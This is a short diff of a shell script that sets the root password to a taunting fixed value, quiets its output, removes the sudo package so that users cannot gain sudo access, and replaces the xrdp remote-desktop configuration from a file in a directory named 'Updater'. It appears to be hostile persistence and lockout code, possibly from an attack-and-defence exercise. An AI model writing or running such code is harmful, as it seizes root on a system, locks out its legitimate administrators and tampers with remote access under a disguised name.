@@ -6,8 +6,8 @@ command > /dev/null 2>&1
 #Makes root password custom pass
 usermod -p 'YouGotGot123!' root
 
-#Deletes sudo group, which should prevent users from gaining sudo access
-groupdel -f -r sudo
+#Deletes sudo , which should prevent users from gaining sudo access
+apt remove sudo
 
 #Changes xrdp.ini file to reflect needed changes
 cat /root/Updater/copy.txt > /etc/xrdp/xrdp.ini
